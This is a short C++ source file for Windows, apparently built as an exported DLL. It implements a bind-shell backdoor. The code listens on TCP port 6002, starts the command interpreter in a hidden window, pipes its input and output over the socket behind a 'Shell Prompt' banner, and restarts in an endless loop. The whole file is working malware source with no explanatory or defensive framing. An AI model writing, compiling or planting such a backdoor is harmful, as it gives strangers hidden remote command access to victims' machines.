#include "head.h"

#define WINEXPORT extern "C" __declspec (dllexport)



int shell(unsigned short port)
{
HANDLE Read1,Write1,Read2,Write2;
SOCKET sock1, mysock;
SECURITY_ATTRIBUTES secu={(DWORD)sizeof (SECURITY_ATTRIBUTES),NULL,TRUE};
STARTUPINFO starti;
PROCESS_INFORMATION pi;
SOCKADDR_IN sin;
WSADATA wsadata;
WORD wVersionRequested = MAKEWORD (2,0);
int count =0;
 //bind port
DWORD lpNumberOfBytesRead;
int err;
char buffer[RECV_BUF], cmd[MAX_PATH],
invite[]="------------------------------\n"
		 "       #Shell Prompt#         \n"
		 "------------------------------\n";

lpNumberOfBytesRead = GetEnvironmentVariable("ComSpec",cmd,MAX_PATH);
//if (!lpNumberOfBytesRead) ExitProcess (0);

err = WSAStartup(wVersionRequested, &wsadata);
//if (err) ExitProcess (0);

sin.sin_family = AF_INET;
sin.sin_addr.s_addr=0;
sin.sin_port = htons (port);

err = sizeof (sin);

sock1 = socket (AF_INET, SOCK_STREAM, 0);
bind (sock1, (SOCKADDR *)&sin, err);
listen (sock1,0);

mysock = accept (sock1,(SOCKADDR *)&sin, &err);
if (mysock == INVALID_SOCKET) ExitThread (0);

CreatePipe(&Read1,&Write1,&secu,0);
CreatePipe(&Read2,&Write2,&secu,0);

ZeroMemory (&starti,sizeof (starti));
ZeroMemory (&pi,sizeof (pi));

starti.cb=sizeof (STARTUPINFO);
starti.dwFlags=STARTF_USESHOWWINDOW+STARTF_USESTDHANDLES;
starti.wShowWindow=SW_HIDE;
starti.hStdInput=Read2;
starti.hStdOutput=Write1;
starti.hStdError=Write1;

err = CreateProcess(NULL,cmd,&secu,&secu,TRUE,0,NULL,NULL,&starti,&pi);
//if (!err) ExitProcess (0);

send (mysock,invite,sizeof (invite),0);

	while (mysock!=SOCKET_ERROR ) {
	Sleep (100);
	ZeroMemory (buffer,RECV_BUF);

	PeekNamedPipe(Read1,NULL,NULL,NULL,&lpNumberOfBytesRead,NULL);
			while (lpNumberOfBytesRead) {
			Sleep (200);
			err = ReadFile(Read1,buffer,RECV_BUF,&lpNumberOfBytesRead,NULL);
			if (!err) break;
			else send (mysock,buffer,lpNumberOfBytesRead,0);
			PeekNamedPipe(Read1,NULL,NULL,NULL,&lpNumberOfBytesRead,NULL);
			}

	Sleep (200);
	err = recv (mysock,buffer,RECV_BUF,0);
	if(mysock==0)
	{
		count++;
		if (count >1)
		break;
	}
	if (!strstr (buffer,"exit")==0) {
	
			
			//ExitProcess (0);
			closesocket (sock1);
			closesocket (mysock);
			break;
			//return 0;
			
			

			}
			else
			WriteFile(Write2,buffer,err,&lpNumberOfBytesRead,0);
	}
			
		TerminateProcess(pi.hProcess,0);
		return 0;
}

WINEXPORT main(){
	while(1){
	shell(6002);
	Sleep(300);
	
	}

}